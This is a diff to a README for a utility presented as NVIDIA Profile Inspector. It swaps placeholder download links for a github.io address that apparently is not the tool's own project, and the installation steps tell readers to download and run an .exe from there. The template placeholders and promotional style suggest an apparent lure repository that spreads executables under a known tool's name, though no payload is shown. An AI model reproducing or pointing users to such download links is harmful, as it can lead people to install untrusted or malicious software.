@@ -2,7 +2,8 @@
 
 NVIDIA Profile Inspector is a powerful utility that unlocks advanced control over hidden NVIDIA driver settings and game-specific profiles. Ideal for gamers, power users, and system tweakers.
 
-[![Download Tool](https://img.shields.io/badge/Download-NVIDIA_Profile_Inspector-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Tool](https://img.shields.io/badge/Download-NVIDIA_Profile_Inspector-blueviolet)](https://nvidia-profile-inspector.github.io/.github
+)
 
 ---
 
@@ -38,7 +39,8 @@ NVIDIA Profile Inspector is a powerful utility that unlocks advanced control ove
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 **Download the archive** from the [Releases](https://nvidia-profile-inspector.github.io/.github
+)  
 2. 📁 **Extract the folder** anywhere on your system  
 3. 🖱 **Run `nvidiaProfileInspector.exe`** directly (no install needed)  
 4. ✅ Tweak any profile and hit **Apply Changes**
